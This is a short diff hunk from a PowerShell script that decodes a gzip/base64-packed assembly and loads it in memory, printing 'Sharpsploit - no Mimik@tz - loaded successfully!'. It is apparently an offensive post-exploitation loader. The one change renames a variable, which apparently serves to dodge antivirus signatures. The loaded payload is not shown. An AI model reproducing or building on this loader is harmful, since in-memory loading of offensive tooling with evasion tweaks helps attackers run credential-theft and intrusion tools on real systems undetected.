@@ -35,7 +35,7 @@ try
 {
     Add-Type -TypeDefinition $gzipbyte -Language CSharp
     $a = [GzipandBase64.Program]::back()
-    $ASD = [System.Reflection.Assembly]::Load($a)
+    $RAS = [System.Reflection.Assembly]::Load($a)
     Write-Host "Sharpsploit - no Mimik@tz - loaded successfully!"
 }
 catch
